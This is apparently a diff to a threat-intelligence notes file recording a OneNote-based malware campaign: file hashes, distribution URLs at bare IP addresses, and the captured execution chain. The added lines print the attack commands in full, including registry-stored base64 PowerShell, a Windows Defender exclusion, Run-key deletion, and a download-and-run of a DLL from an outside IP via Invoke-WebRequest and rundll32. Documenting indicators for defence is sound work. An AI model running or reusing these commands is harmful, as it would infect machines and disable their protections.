@@ -41,14 +41,39 @@ rundll32.exe  C:\Users\Public\Documents\ssd.dll,RS32
 
 distro urls
 
-
 http://138.197.74.198/eRV/020
 http://157.245.254.227/EMs6DTE/020
 http://143.244.147.175/3r7w/020
 
+*************************************************
+
+Onenote campaign
+
+.one e061a4bf2a5310fc2b7f208129d2ec1e7ba9dbe41b3db253795205b0aeb1f5f3
+.wsf 6a4687ed0a27f7d56c5edc5b79a956e19e729b40ffa30764a89a05eb742a0be6
+.dll 22fc84e7a0d54ce1774adf55ec0212c18fd322acf57b0f18d16858fffdfd8072
 
 *************************************************
 
+Onenote Exec >
+
+WScript.exe C:\Users\Admin\AppData\Local\Temp\O P E N.wsf
+
+reg.exe add HKCU\SOFTWARE\viceregent /v capturerOvercramming /d HhVeHJmSSZkAZnCjgsQfewwsssHpCccEmiArcSKhHjQqxVoHwMUxwDgOMtpDPUevcOOWHJvrUAlSRnnFOhIrSKwbXWKlzewywxaVNyKyGhvmNifKjmBJOLnBeijiVZqpzBgeGNMaCaFXatOVaSlDnyNkcaAbTuDrCerCoHmulewEbTKNwHIkkSVSePHsIqhEIKZiEXVgGfrxrmqGBtcwUWeEYUoivbwTQFtGaUMyXuwIHIAMgbUZhTiRgjrbDxQskYSBkRQthhPIyuqcdkmiZiZODakmyhoZjrhVNLwnTctgqFAYvwunzOicGVhjUwfgZfhUHbYDkMcBQKYCXIqczsVGwfdmYqvPaWfKWUNRLnPwzHhSZSKuJyMMMEJKGkqPvqsNePdgyUqWKObpnJViSwSqMRIGDFTpHOllohulZlkmNyXYcgfIWWOiBhNROPTxGxAwydKAkeI
+
+reg.exe add HKCU\SOFTWARE\aldehydaseEmbrail /v genoblasticReexercised /d HAAeQBUAGEAbQBwAG8AeQAgAD0AIABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAASABLAEMAVQA6AFwAXABTAE8ARgBUAFcAQQBSAEUAXABcAHYAaQBjAGUAcgBlAGcAZQBuAHQAIAB8ACAAJQB7ACQAXwAuAGcAZQBuAG8AYgBsAGEAcwB0AGkAYwBSAGUAZQB4AGUAcgBjAGkAcwBlAGQAfQA7ACAAJABLAGUAbgBtAHAAeQBUAGEAbQBwAG8AeQAgAD0AIAAiAFcAbwByAHIAaQBsAGUAcwBzACIAIAArACAAJABLAGUAbgBtAHAAeQBUAGEAbQBwAG8AeQA7ACAAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoAZgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQASwBlAG4AbQBwAHkAVABhAG0AcABvAHkAKQApADsAIABbAGMAbABhAHMAcwBpAGMAeQBjADEAXQA6ADoARQB4AGUAYwB1AHQAZQAoACIAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwB1AHQAaQBvAG4AcABvAGwAaQBjAHkAIABiAHkAcABhAHMAcwAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4AIAAiACIAYAAkAGMAdQByAHIAZQBuAHQARAByAGkAdgBlACAAPQAgAGAAKABnAGUAdAAtAGwAbwBjAGEAdABpAG8AbgBgACkALgBEAHIAaQB2AGUALgBOAGEAbQBlACAAKwAgACcAOgBcACcAOwAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABgACQAYwB1AHIAcgBlAG4AdABEAHIAaQB2AGUAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxADAAOwByAGUAZwAgAGQAZQBsAGUAdABlACAASABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIAAvAHYAIABVAHMAZQByAGkAbgBpAHQAIAAvAGYAOwAgAHIAZQBnACAAZABlAGwAZQB0AGUAIABIAEsARQBZAF8AQwBVAFIAUgBFAE4AVABfAFUAUwBFAFIAXABTAE8ARgBUAFcAQQBSAEUAXAB2AGkAYwBlAHIAZQBnAGUAbgB0ACAALwB2ACAAZwBlAG4AbwBiAGwAYQBzAHQAaQBjAFIAZQBlAHgAZQByAGMAaQBzAGUAZAAgAC8AZgAiACIAIgApADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADMAOAAuADEAOQA3AC4ANwA0AC4AMQA5ADgALwBlAFIAVgAvADAAMgAwACAALQBPACAAJABlAG4AdgA6AFQARQBNAFAAXABCAGwAbwBvAGQAYwB1AHIAZABsAGUAcgBNAGkAagBuAGgAZQBlAHIAcwAuAGQAbABsADsAIAByAHUAbgBkAGwAbAAzADIAIAAkAGUAbgB2ADoAVABFAE0AUABcAFwAQgBsAG8AbwBkAGMAdQByAGQAbABlAHIATQBpAGoAbgBoAGUAZQByAHMALgBkAGwAbAAsAFIAUwAzADIAOwA=
+
+reg.exe add HKCU\SOFTWARE\aldehydaseEmbrail /v TheosophyWaumle /d yFehfdmDyVtmHzxccYddIuprNOXNsitRFSrsjhgRN
+
+reg.exe add HKCU\SOFTWARE\aldehydaseEmbrail /v cattimandooPrebilled /d icvZAmopJUreXqlokWdSiWBYichHeBmSFgBSzLKcYkLiRVDuRCsrbJmfbAdJsujHxaLHrAjzlJLkYVdcIyESyDbpErVujLWAGjRKvXLtCnDXpvZVYLnONRkcJggHSQnObDEjUvuLutUtYfmriCbsMdQNrKDhizOaVRufVBfcbssIdUzaRzHqVbUHgQqfVOiVwViMtPjWQFQXjUUeXbdPZVbIKNfMphXSClrhoIZHduZjNAcVNbQuJNHJpmoJvYbfngLcSGGdyWdljOQvpoeXuQtiNAoYuUuFFjFvWdsCGIjnxxhTXpzcIZyHhwZgrtZlwXrIPecrlAdKJrwRCxjtnMcAVihEEXoSoOstCyqJFyBsmjhtKVWdYzCPyMEAbiiTJXXNLOoLtDPapUkvPirVIJbllzgOh
+
+powershell.exe" $aldehydaseEmbrail = Get-ItemProperty -Path HKCU:\SOFTWARE\aldehydaseEmbrail | %{$_.genoblasticReexercised}; powershell -windowstyle Minimized -encodedcommand "JABLAGUAbgBtA$aldehydaseEmbrail"
+
+powershell.exe" -windowstyle Minimized -encodedcommand $KenmpyTampoy = Get-ItemProperty -Path HKCU:\\SOFTWARE\\viceregent | %{$_.genoblasticReexercised}; $KenmpyTampoy = "Worriless" + $KenmpyTampoy; [Reflection.Assembly]::Load([Convert]::fromBase64String($KenmpyTampoy)); [classicyc1]::Execute("powershell -executionpolicy bypass -windowstyle hidden ""`$currentDrive = `(get-location`).Drive.Name + ':\'; Add-MpPreference -ExclusionPath `$currentDrive;Start-Sleep -Seconds 10;reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Userinit /f; reg delete HKEY_CURRENT_USER\SOFTWARE\viceregent /v genoblasticReexercised /f""");Start-Sleep -Seconds 10;Invoke-WebRequest http://138.197.74.198/eRV/020 -O $env:TEMP\BloodcurdlerMijnheers.dll; rundll32 $env:TEMP\\BloodcurdlerMijnheers.dll,RS32;Ъ
+
+C:\Windows\system32\WerFault.exe -u -p 3420 -s 2500
+
+cmd.exe" /c start https://support.microsoft.com/office/troubleshoot-errors-in-onenote-for-windows-10-942b006c-46ac-4300-a629-7fac5ae4dc70
 
 *************************************************
 
